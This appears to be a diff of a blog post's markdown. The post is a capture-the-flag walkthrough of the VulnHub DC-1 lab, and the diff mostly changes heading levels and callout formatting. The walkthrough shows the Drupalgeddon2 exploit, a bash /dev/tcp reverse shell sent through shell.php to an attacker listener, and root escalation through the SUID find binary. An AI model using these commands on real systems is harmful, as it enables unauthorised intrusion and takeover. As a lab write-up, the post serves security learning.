@@ -2,14 +2,14 @@
 layout: post
 author: H4
 ---
-# PG VULNHUB DC-1
+
 [Details](https://www.vulnhub.com/entry/dc-1,292/)
 
-## enumeration
+# enumeration
 
 Performing a `nmap` scan to identify the attack surface of the target.
 
-### nmap
+## nmap
 ```bash
 nmap 192.168.200.193       
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-27 13:38 EDT
@@ -24,15 +24,17 @@ PORT    STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
 ```
 
-### web server (port 80)
+## web server (port 80)
 - `gobuster` did not reveal anything useful on the web server on port `80`
 - website with drupal installation  
--> maybe vulnerable to `druaplgeddon`
+
+> maybe vulnerable to `druaplgeddon`
+{: .prompt-info }
 
 ---
 
-## exploitation
-### durpalgeddon2
+# exploitation
+## durpalgeddon2
 ```bash
 git clone https://github.com/dreadlocked/Drupalgeddon2.git
 ```
@@ -82,17 +84,17 @@ Yay! RCE works!
 
 ---
 
-## post exploitation
-### full reverse shell
+# post exploitation
+## full reverse shell
 `drupalgeddon` deploys a simple `shell.php` and we will exploit this to get a cute reverse shell.
 
-#### listener on attacker machine
+### listener on attacker machine
 ```bash
-nc -lvp 80
+$ nc -lvp 80
 listening on [any] 80 ...
 ```
 
-#### on target machine
+### on target machine
 payload: `bash -c 'bash -i >& /dev/tcp/192.168.49.200/80 0>&1'`
 ```http
 GET /shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.200/80+0>%261' HTTP/1.1
@@ -106,9 +108,9 @@ Cookie: has_js=1
 Connection: close
 ```
 
-#### catch reverse connection
+### catch reverse connection
 ```bash
-nc -lvp 80
+$ nc -lvp 80
 listening on [any] 80 ...
 192.168.200.193: inverse host lookup failed: Unknown host
 connect to [192.168.49.200] from (UNKNOWN) [192.168.200.193] 45807
@@ -118,7 +120,7 @@ whoami
 www-data
 ```
 
-#### make it beautiful
+### make it beautiful
 ```bash
 www-data@DC-1:/var/www$ python -c 'import pty;pty.spawn("/bin/bash")'
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -138,7 +140,7 @@ www-data
 ```
 Now we got a fully interactive shell with autocomplete etc. :)
 
-### first flag
+## first flag
 ```bash
 www-data@DC-1:/var/www$ cd /
 www-data@DC-1:/$ cd home
@@ -147,12 +149,11 @@ flag4  local.txt
 www-data@DC-1:/home$ cat local.txt
 7******************************8
 ```
--> `7******************************8`
 
-### privilege escalation
-#### check for suid binaries
+## privilege escalation
+### check for suid binaries
 ```bash
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 -rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
 -rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
 -rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
@@ -185,9 +186,8 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 -rwxr-sr-x 1 root shadow 30332 May  5  2012 /sbin/unix_chkpwd
 -rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
 ```
--> `find` looks juicy!  
-  
-Check [gtfobins](https://gtfobins.github.io/) on how to exploit `find` to gain `root` access.
+> `find` looks juicy! Check [gtfobins](https://gtfobins.github.io/) on how to exploit `find` to gain `root` access.
+{: .prompt-info }
 
 ```bash
 www-data@DC-1:/home$ whereis find
@@ -196,8 +196,9 @@ www-data@DC-1:/home$ find . -exec /bin/sh \; -quit
 # whoami
 root
 ```
+There we go!
 
-### second flag
+## second flag
 ```bash
 # cd /root
 # ls
@@ -205,6 +206,5 @@ proof.txt  thefinalflag.txt
 # cat proof.txt
 0******************************1
 ```
--> `0******************************1`  
   
 Pwned! <@:-)
